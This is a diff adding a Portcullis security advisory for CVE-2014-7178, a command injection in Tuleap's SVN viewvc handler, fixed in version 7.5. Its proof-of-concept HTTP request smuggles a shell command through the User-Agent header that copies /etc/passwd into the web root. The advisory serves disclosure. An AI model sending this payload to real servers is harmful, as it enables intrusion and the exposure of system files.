@@ -1,0 +1,41 @@
+Vulnerability title: Tuleap <= 7.4.99.5 Remote Command Execution in Enalean Tuleap
+CVE: CVE-2014-7178
+Vendor: Enalean
+Product: Tuleap
+Affected version: 7.4.99.5 and earlier
+Fixed version: 7.5
+Reported by: Jerzy Kramarz
+
+Details:
+
+Tuleap does not validate the syntax of the requests submitted to SVN handler pages in order to validate weather request passed to passthru() function are introducing any extra parameters that would be executed in the content of the application.
+
+This vulnerability can be exploited by external attackers to introduce external commands into the workflow of the application that would execute them as shown on the attached Proof Of Concept code below.
+
+After registering with the application and sending a request similar to the one below the vulnerability can be triggered:
+
+
+GET /svn/viewvc.php/?roottype=svn&root=t11 HTTP/1.1
+Host: [IP]
+User-Agent: M" && cat /etc/passwd > /usr/share/codendi/src/www/passwd.txt && "ozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://[IP]/svn/?group_id=102
+Cookie: PHPSESSID=2uqjkd0iupn84gigi4e1tekg95; TULEAP_session_hash=362a9e41d1a93c8f195db4ccc6698ef5
+Connection: keep-alive
+Cache-Control: max-age=0
+
+
+Note: In order to exploit this vulnerability a user needs to be in position to see SVN repository.
+
+
+Further details at:
+
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-7178/
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
